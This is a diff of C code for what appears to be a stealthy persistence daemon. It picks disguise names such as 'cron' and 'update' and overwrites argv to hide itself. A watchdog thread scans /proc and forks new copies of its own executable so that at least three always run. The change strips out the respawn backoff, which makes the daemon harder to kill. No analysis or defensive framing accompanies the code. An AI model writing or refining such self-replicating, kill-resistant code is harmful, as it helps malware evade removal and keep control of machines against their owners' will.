@@ -17,7 +17,8 @@
 #include <errno.h>
 #include <limits.h>
 #include "headers/daemon.h"
-// replaced daemon file with backup one
+// Backup daemon.c #4*
+// New replace in 600s after debug
 static const char* get_random_name(void) {
     static const char *names[] = {
         "update", "cache", "cron", "logs",
@@ -168,7 +169,6 @@ void overwrite_argv(int argc, char** argv) {
 void* watchdog(void* arg) {
     static int last_spawn_time = 0;
     static int consecutive_fails = 0;
-    static time_t last_check_time = 0;
     static int last_found_copies = 0;
     
     while (1) {
@@ -194,7 +194,6 @@ void* watchdog(void* arg) {
 
         while ((ent = readdir(proc)) != NULL) {
             if (!isdigit((unsigned char)ent->d_name[0])) continue;
-            
             pid_t pid = atoi(ent->d_name);
             if (pid == current_pid) continue;
             
@@ -226,23 +225,11 @@ void* watchdog(void* arg) {
         }
         closedir(proc);
 
-        time_t elapsed_time = current_time - last_check_time;
-        last_found_copies = found_copies;
-
-        if ((last_found_copies > found_copies && elapsed_time > 30)) {
-            consecutive_fails = 0;
-            last_check_time = current_time;
-        }
-
-        int spawn_delay;
         if (found_copies < last_found_copies) {
-            spawn_delay = 10;
-        } else {
-            spawn_delay = 20 * (1 << consecutive_fails);
-            spawn_delay = (spawn_delay > 180) ? 180 : spawn_delay;
+            consecutive_fails = 0;
         }
 
-        if (found_copies < 3 && (current_time - last_spawn_time) >= spawn_delay) {
+        if (found_copies < 3) {
             char source_path[PATH_MAX] = {0};
             ssize_t path_len = readlink("/proc/self/exe", source_path, sizeof(source_path)-1);
             if (path_len > 0) {
@@ -272,7 +259,6 @@ void* watchdog(void* arg) {
                             }
                             exit(0);
                         } else if (pid > 0) {
-                            last_spawn_time = current_time;
                             spawn_success = 1;
                             consecutive_fails = 0;
                         }
@@ -287,16 +273,8 @@ void* watchdog(void* arg) {
             }
         }
 
-        int sleep_time;
-        if (found_copies < last_found_copies) {
-            sleep_time = 3;
-        } else if (found_copies < 3) {
-            sleep_time = 4;
-        } else {
-            sleep_time = 8 + (consecutive_fails * 2);
-            sleep_time = (sleep_time > 30) ? 30 : sleep_time;
-        }
-        sleep(sleep_time);
+        last_found_copies = found_copies;
+        sleep(found_copies < 3 ? 3 : 8);
     }
     return NULL;
 }
